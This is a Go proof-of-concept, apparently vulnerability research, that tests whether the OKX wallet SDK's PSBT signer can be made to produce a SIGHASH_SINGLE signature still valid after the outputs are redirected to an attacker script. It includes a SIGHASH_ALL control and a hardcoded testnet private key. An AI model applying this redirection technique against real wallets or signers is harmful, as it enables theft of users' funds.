package main

import (
	"bytes"
	"encoding/hex"
	"fmt"

	"github.com/btcsuite/btcd/btcec/v2/ecdsa"
	"github.com/btcsuite/btcd/btcutil"
	"github.com/btcsuite/btcd/btcutil/psbt"
	"github.com/btcsuite/btcd/chaincfg"
	"github.com/btcsuite/btcd/txscript"
	"github.com/btcsuite/btcd/wire"
	"github.com/okx/go-wallet-sdk/coins/bitcoin"
)

const wif = "cPnvkvUYyHcSSS26iD1dkrJdV7k1RoUqJLhn3CYxpo398PdLVE22"

func main() {
	w, _ := btcutil.DecodeWIF(wif)
	pub := w.PrivKey.PubKey()
	pkh := btcutil.Hash160(pub.SerializeCompressed())
	addr, _ := btcutil.NewAddressWitnessPubKeyHash(pkh, &chaincfg.TestNet3Params)
	own := addr.EncodeAddress()

	want, _ := bitcoin.PayToWitnessPubKeyHashScript(pkh)
	utx := wire.NewMsgTx(2)
	utx.AddTxIn(wire.NewTxIn(&wire.OutPoint{Hash: [32]byte{0xaa}, Index: 0}, nil, nil))
	utx.AddTxIn(wire.NewTxIn(&wire.OutPoint{Hash: [32]byte{0x77}, Index: 1}, nil, nil))
	utx.AddTxOut(wire.NewTxOut(546, want))
	p0, perr := psbt.NewFromUnsignedTx(utx)
	if perr != nil { fmt.Printf("CELL W0 err=%v\n", perr); return }
	p0.Inputs[0].WitnessUtxo = wire.NewTxOut(5000, want)
	p0.Inputs[1].WitnessUtxo = wire.NewTxOut(1000, want)
	var b1 bytes.Buffer
	_ = p0.Serialize(&b1)
	psbtHex := hex.EncodeToString(b1.Bytes())
	idx := 1
	fmt.Printf("CELL W0-shape inputs=%d outputs=%d victim_index=%d (single-bug needs idx>=outputs)\n", len(p0.Inputs), len(p0.UnsignedTx.TxOut), idx)

	opt := &bitcoin.SignPsbtOption{AutoFinalized: true, ToSignInputs: []*bitcoin.ToSignInput{{Index: idx, Address: own, SigHashTypes: []int{0x03}}}}
	signedHex, err := bitcoin.SignPsbtWithKeyPathAndScriptPath(psbtHex, wif, &chaincfg.TestNet3Params, opt)
	if err != nil { fmt.Printf("CELL W1-sign-0x03 err=%v\n", err); return }
	sraw, _ := hex.DecodeString(signedHex)
	sp, _ := psbt.NewFromRawBytes(bytes.NewReader(sraw), false)
	for i := range sp.Inputs {
		if len(sp.Inputs[i].FinalScriptSig)+len(sp.Inputs[i].FinalScriptWitness) == 0 {
			sp.Inputs[i].FinalScriptWitness = []byte{0x00}
		}
	}
	tx, xerr := psbt.Extract(sp)
	if xerr != nil { fmt.Printf("CELL W1-extract err=%v\n", xerr); return }
	sig := tx.TxIn[idx].Witness[0]
	scriptCode, _ := bitcoin.PayToPubKeyHashScript(pkh)

	prevOuts := map[wire.OutPoint]*wire.TxOut{}
	for i := range sp.Inputs {
		if sp.Inputs[i].WitnessUtxo != nil { prevOuts[tx.TxIn[i].PreviousOutPoint] = sp.Inputs[i].WitnessUtxo }
	}
	f0 := txscript.NewMultiPrevOutFetcher(prevOuts)
	h0 := txscript.NewTxSigHashes(tx, f0)
	ht := txscript.SigHashType(sig[len(sig)-1])
	d0, derr0 := txscript.CalcWitnessSigHash(scriptCode, h0, ht, tx, idx, sp.Inputs[idx].WitnessUtxo.Value)
	parsed, _ := ecdsa.ParseDERSignature(sig[:len(sig)-1])
	origOK := derr0 == nil && parsed.Verify(d0, pub)

	mod := tx.Copy()
	atkScript, _ := bitcoin.PayToWitnessPubKeyHashScript(bytes.Repeat([]byte{0x22}, 20))
	mod.TxOut = nil
	mod.AddTxOut(wire.NewTxOut(999, atkScript))
	f1 := txscript.NewMultiPrevOutFetcher(prevOuts)
	h1 := txscript.NewTxSigHashes(mod, f1)
	d1, derr1 := txscript.CalcWitnessSigHash(scriptCode, h1, ht, mod, idx, sp.Inputs[idx].WitnessUtxo.Value)
	redirOK := derr1 == nil && parsed.Verify(d1, pub)
	fmt.Printf("CELL W1-sign-0x03 err=nil hash_byte=0x%02x idx=%d n_out=%d\n", ht, idx, len(tx.TxOut))
	fmt.Printf("CELL W2-p2wpkh-single original_valid=%v redirected_output_to_0x22_script_still_valid=%v\n", origOK, redirOK)

	opt2 := &bitcoin.SignPsbtOption{AutoFinalized: true, ToSignInputs: []*bitcoin.ToSignInput{{Index: idx, Address: own, SigHashTypes: []int{0x01}}}}
	s2, err2 := bitcoin.SignPsbtWithKeyPathAndScriptPath(psbtHex, wif, &chaincfg.TestNet3Params, opt2)
	if err2 != nil { fmt.Printf("CELL W3-control err=%v\n", err2); return }
	raw2, _ := hex.DecodeString(s2)
	sp2, _ := psbt.NewFromRawBytes(bytes.NewReader(raw2), false)
	for i := range sp2.Inputs {
		if len(sp2.Inputs[i].FinalScriptSig)+len(sp2.Inputs[i].FinalScriptWitness) == 0 {
			sp2.Inputs[i].FinalScriptWitness = []byte{0x00}
		}
	}
	tx2, _ := psbt.Extract(sp2)
	sig2 := tx2.TxIn[idx].Witness[0]
	ht2 := txscript.SigHashType(sig2[len(sig2)-1])
	p2, _ := ecdsa.ParseDERSignature(sig2[:len(sig2)-1])
	f2 := txscript.NewMultiPrevOutFetcher(prevOuts)
	d2, _ := txscript.CalcWitnessSigHash(scriptCode, txscript.NewTxSigHashes(mod, f2), ht2, mod, idx, sp2.Inputs[idx].WitnessUtxo.Value)
	fmt.Printf("CELL W3-control-0x01 redirected_still_valid=%v (expect false)\n", p2.Verify(d2, pub))
}
